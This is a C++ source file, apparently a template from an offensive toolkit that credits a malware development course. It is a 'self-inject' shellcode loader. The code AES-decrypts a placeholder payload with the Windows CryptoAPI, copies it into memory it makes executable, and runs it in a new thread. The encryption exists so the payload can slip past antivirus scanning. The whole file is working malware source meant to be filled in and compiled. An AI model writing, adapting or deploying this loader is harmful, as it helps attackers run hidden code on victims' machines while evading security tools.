// c++ vanilla self-inject
// https://github.com/skahwah
// credit to reenz0h (twitter: @sektor7net) for the sektor7 maldev course.
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /TcFILENAME_TEMPLATE.cpp /link /OUT:FILENAME_TEMPLATE.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

int Decrypt(char * payload, unsigned int payload_len, char * key, size_t keylen, char * iv) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        DWORD mode = CRYPT_MODE_CBC;


        // Acquire a PROV_RSA_AES context
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, 0)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        // SHA-256 hash the AES key
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)){
                return -1;
        }
        // Set the mode to CBC
        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE *)&mode, 0)) {
                return -1;
        }
        // Set the custom AES initialization value
        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
                return -1;
        }
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int main(void){
        void * exec_mem;
        BOOL rv;
        HANDLE th;
        DWORD oldprotect = 0;

        char iv[] = AES_IV_TEMPLATE
        char key[] = AES_KEY_TEMPLATE
        unsigned char payload[] = PAYLOAD_TEMPLATE

        unsigned int payload_len = sizeof(payload);

        // Allocate memory for payload
        exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        // Decrypt payload
        Decrypt((char *) payload, payload_len, key, sizeof(key), iv);
        
        // Copy payload to allocated buffer
        RtlMoveMemory(exec_mem, payload, payload_len);
        
        // Make the buffer executable
        rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

        // Launch the payload
        if ( rv != 0 ) {
                        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
                        WaitForSingleObject(th, -1);
        }

        return 0;
}